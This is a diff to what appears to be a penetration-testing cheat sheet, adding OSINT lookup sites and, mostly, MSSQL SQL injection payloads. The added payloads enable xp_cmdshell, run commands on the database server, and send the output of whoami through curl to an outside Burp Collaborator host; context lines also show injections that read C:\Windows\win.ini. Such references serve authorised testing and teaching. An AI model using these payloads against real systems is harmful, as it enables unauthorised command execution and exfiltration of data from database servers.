@@ -114,6 +114,12 @@ gobuster -e -u http://<IPADDRESS:PORT> -w <WORDLIST> -c PHPSESSID=<COOKIESTRING>
 - https://services.normshield.com
 - https://joe.black/leakengine.html
 - https://www.social-searcher.com/
+- https://phonebook.cz/
+- https://whatsmyname.app/
+- https://xtea.io/ts_en.html#gsc.tab=0
+- https://www.hackerpom.com/feed
+- https://searchcode.com/
+- https://fofa.so/
 
 ### Search Book
 - https://b-ok.org/
@@ -122,7 +128,7 @@ gobuster -e -u http://<IPADDRESS:PORT> -w <WORDLIST> -c PHPSESSID=<COOKIESTRING>
 - b-ok.cc : https://b-ok.cc/
 - b-ok2.org :  https://b-ok2.org/
 - booksc : https://booksc.xyz/
-ư◾️ https://ebookpdf.com
+- https://ebookpdf.com
 
 ### RCE
 ```
@@ -397,6 +403,10 @@ A period instead of a whitespace between FROM and a column name:
 -1+union+select+null,(select+x+from+OpenRowset(BULK+’C:\Windows\win.ini’,SINGLE_CLOB)+R(x)),null,null
 1+and+1=(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x))-- 
 -1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
+ '; EXEC sp_configure ‘show advanced options’, 1; RECONFIGURE; EXEC sp_configure ‘xp_cmdshell’, 1; RECONFIGURE;--
+ '; EXEC xp_cmdshell 'ping myburpcollablink.burpcollaborator.net';--
+ ';EXEC xp_cmdshell ‘powershell -c “$x = whoami; curl http://my-burp-link.burpcollaborator.net/get?output=$x"';--
+ 
 
 ** Error-Based vectors **
 - SUSER_NAME()
